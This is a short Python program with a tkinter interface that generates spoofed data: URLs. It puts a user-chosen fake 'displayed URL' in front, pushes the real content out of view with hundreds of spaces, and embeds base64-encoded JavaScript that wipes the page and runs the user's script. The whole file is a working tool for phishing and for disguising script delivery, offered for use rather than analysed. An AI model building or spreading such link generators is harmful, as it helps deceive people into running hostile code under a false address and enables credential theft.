import tkinter.ttk as ttk
import tkinter as tk
import random
import base64
def URL2JS(js, fakeurl=''):
        if not fakeurl:fakeurl='h'
        js='document.body.innerHTML = "";'+js
        js=base64.b64encode(js.encode('utf-8')).decode('utf-8')
        data='data:text/html,{url}{space}<script src=data:text/html;base64,{js}></script>'
        space=' '*random.randint(200, 400)
        return data.format(url=fakeurl, space=space, js=js)
class GUI(ttk.Frame):
    def __init__(self, master=None):
        super().__init__(master)
        ttk.Label(self, text='Displayed URL:  ').grid(column=0,row=1,sticky='w')
        self.url=tk.Text(self, height=1)
        self.url.grid(column=1, row=1, sticky='nw')
        ttk.Label(self, text='Javascript:').grid(column=0,row=2,sticky='nw')
        self.js=tk.Text(self, height=10)
        self.js.grid(column=1, row=2, sticky='nw')
        ttk.Button(self, text='Generate',
                   command=self.generate).grid(column=0, row=3,sticky='nw')
        self.result=tk.Text(self, height=10)
        self.result.grid(column=1, row=3, sticky='nw')
    def generate(self):
        self.result.delete('1.0', 'end')
        result=self.js.get("1.0",'end-1c')
        fakeurl=self.url.get("1.0",'end-1c')
        result=URL2JS(result, fakeurl=fakeurl)
        self.result.insert('end', result)
